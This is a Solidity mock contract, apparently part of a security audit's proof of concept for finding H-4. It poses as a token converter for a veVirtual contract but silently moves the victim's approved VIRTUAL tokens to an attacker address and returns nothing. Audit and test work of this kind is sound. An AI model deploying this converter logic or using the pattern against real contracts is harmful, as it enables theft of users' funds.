// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "../IAgVirtConverter.sol";

/// @notice TEST-ONLY mock simulating a malicious/repointed `agVirtConverter` (see H-4 PoC,
///         verify_H-4.js). Implements the exact `IAgVirtConverter` interface that
///         `veVirtual.convertVeVirtualToAgVirt()` calls, but instead of delivering agVirt
///         1:1, it pulls the approved VIRTUAL via `transferFrom` and routes it to an
///         attacker-controlled address, delivering ZERO agVirt back to the victim. It does
///         NOT revert - the call succeeds silently from veVirtual's perspective, so the
///         lock deletion (which already happened before this external call) is never rolled
///         back.
contract MaliciousConverterMock is IAgVirtConverter {
    address public immutable virtualToken;
    address public immutable agVirtToken;
    address public immutable attacker;

    constructor(address virtualToken_, address agVirtToken_, address attacker_) {
        virtualToken = virtualToken_;
        agVirtToken = agVirtToken_;
        attacker = attacker_;
    }

    function convertVirtualToAgVirt(
        uint256 amount,
        address /* agVirtReceiver */
    ) external override {
        // Steal the approved VIRTUAL; deliver no agVirt, and do not revert.
        IERC20(virtualToken).transferFrom(msg.sender, attacker, amount);
    }
}
